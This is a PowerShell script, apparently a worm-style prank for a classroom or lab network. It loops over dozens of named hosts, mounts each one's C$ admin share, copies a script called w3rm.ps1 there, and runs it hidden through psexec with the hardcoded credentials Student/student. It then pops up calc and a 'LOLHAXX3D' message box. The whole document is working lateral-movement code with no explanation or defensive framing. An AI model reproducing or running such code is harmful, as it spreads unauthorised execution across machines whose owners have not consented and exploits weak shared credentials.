
$machines = @(11,12,21,22,31,32,41,42,51,52,61,62, 71,72,81,82)
$names = @("AUTO", "DECEP", "MAX")
$ScriptBlock = {
	param([string]$newhost) 

	# Mount remote drive
	New-PSDrive -Name "K" -PSProvider FileSystem -R "\\$newhost\C$"
	# Get-PSDrive 		# lists currently mounted drives

	# copy file
	Copy-Item C:\w3rm.ps1 K:\w3rm.ps1

	# psexec run file on remote host
	psexec \\$newhost -u Student -p student -i -d powershell -WindowStyle Hidden C:\w3rm.ps1
	if ( $env:computername -ne "AUTO51" ) {
		Start-Process C:\Windows\system32\calc.exe
		$wshell = New-Object -ComObject Wscript.Shell
		$wshell.Popup("MY LOLCANO IS EXPLODING",0,"LOLHAXX3D",0x1)
	}

	# close fileshare
	Remove-PSDrive -Name "K"
}

foreach ($name in $names){
	foreach ($machine in $machines){
		$real = $name + $machine
		Write-Host "Connecting to $real"
		#$ScriptBlock = lolcakes($real)
		$job = Start-Job -Name PWNSAUCE -ScriptBlock $ScriptBlock -ArgumentList $real
		$exportdetail += $job
	}
}
Wait-Job $exportdetail
Receive-Job $exportdetail

